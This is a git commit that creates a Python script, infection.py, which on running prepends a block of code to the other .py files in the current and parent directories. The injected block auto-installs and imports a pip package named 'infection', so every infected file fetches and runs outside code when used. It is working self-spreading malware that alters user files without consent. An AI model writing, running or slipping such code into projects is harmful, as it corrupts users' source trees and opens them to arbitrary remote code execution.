a4f23eedc1008e8c98009e7000e872f8e1a9eaf8
Michalkap28 <116448527+Michalkap28@users.noreply.github.com>
2023-08-03 14:41:43 +0200

    Create infection.py

---
+++ src/infection.py
@@ -0,0 +1,45 @@
+import os
+
+skip = ["trigger.py", "infection.py", "__pycache__"]
+
+text = '''import pip
+
+def import_or_install(package):
+    try:
+        __import__(package)
+    except ImportError:
+        pip.main(['install', package])
+
+import_or_install("infection")
+'''
+
+def get_parent_dir(directory):
+    return os.path.dirname(directory)
+
+def run(dir):
+    if dir != "":
+        os.chdir(dir)
+    files = []
+    for file in os.listdir():
+        if file in skip:
+            continue
+        if os.path.isfile(file):
+            if ".py" in file:
+                files.append(file)
+    
+    
+    for name in files:
+        file_read = open(name, "r")
+        file_read = file_read.read()
+        
+        if text not in file_read:
+            new_content = text + file_read
+        
+            file_write = open(name, "w")
+            file_write.write(new_content)
+            file_write.close()
+
+
+
+run("")
+run(get_parent_dir(os.getcwd()))
